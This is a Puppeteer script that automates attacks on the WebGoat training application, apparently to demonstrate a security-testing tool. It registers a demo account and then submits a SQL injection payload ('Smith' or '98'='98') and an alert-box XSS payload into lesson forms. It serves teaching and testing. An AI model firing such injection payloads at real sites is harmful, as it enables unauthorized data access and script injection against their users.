const puppeteer = require('puppeteer')

(async () => {
  const browser = await puppeteer.launch({headless: true})

  const FQDN = "" //example: http://webgoat8ep-9-ep.westus.azurecontainer.io:8080

  const sqliPayload = "Smith' or '98'='98"
  const xxsPayload = "<script>alert('XSS Test')</script>"
  
  //registering an account

  const page0 = await browser.newPage()
  
  await page0.goto(FQDN + '/WebGoat/registration')
  await page0.type('#username', 'demoperson44')
  await page0.type('#password', 'Contrast')
  await page0.type('#matchingPassword', 'Contrast')
  await page0.focus('#main-content > fieldset > form > div:nth-child(5) > div > div > label > input[type=checkbox]')
  await page0.click('#main-content > fieldset > form > div:nth-child(5) > div > div > label > input[type=checkbox]')
  await page0.click('button.btn.btn-primary')



  //logging in -- if you run the script for the first time, you don't need this, however, the following snippet can be useful if you want to rerun the script.

  /*const page = await browser.newPage()
  await page.goto(FQDN + '/WebGoat/login')
  await page.type('#exampleInputEmail1', 'demoperson')
  await page.type('#exampleInputPassword1', 'Contrast')
  await page.click('button.btn.btn-primary.btn-block')*/
  
  //exercising sqli vulnerability
  const page2 = await browser.newPage()
  await page2.goto(FQDN + '/WebGoat/start.mvc#lesson/SqlInjection.lesson/6', {waitUntil: 'networkidle2'})
  await page2.focus('#lesson-content-wrapper > div.lesson-content > div:nth-child(10) > div.attack-container > form > table > tbody > tr > td:nth-child(2) > input[type=TEXT]')
  await page2.keyboard.type('Smith')
  await page2.click('#lesson-content-wrapper > div.lesson-content > div:nth-child(10) > div.attack-container > form > table > tbody > tr > td:nth-child(3) > input[type=SUBMIT]')
  

  //attacking sqli vulnerability

  const page3 = await browser.newPage()
  await page3.goto(FQDN + '/WebGoat/start.mvc#lesson/SqlInjection.lesson/6', {waitUntil: 'networkidle2'})
  await page3.focus('#lesson-content-wrapper > div.lesson-content > div:nth-child(10) > div.attack-container > form > table > tbody > tr > td:nth-child(2) > input[type=TEXT]')
  await page3.keyboard.type(sqliPayload)
  await page3.click('#lesson-content-wrapper > div.lesson-content > div:nth-child(10) > div.attack-container > form > table > tbody > tr > td:nth-child(3) > input[type=SUBMIT]')

  //attacking xss vulnerability

  const page4 = await browser.newPage()
  await page4.goto(FQDN + '/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6', {waitUntil: 'networkidle2'})
  await page4.focus('#lessonContent > form > table:nth-child(5) > tbody > tr:nth-child(3) > td:nth-child(2) > input[type=TEXT]')
  await page4.keyboard.type(xxsPayload)
  await page4.click('#lessonContent > form > table:nth-child(5) > tbody > tr:nth-child(5) > td > input[type=SUBMIT]')


  browser.close()
  console.log('End')
})()
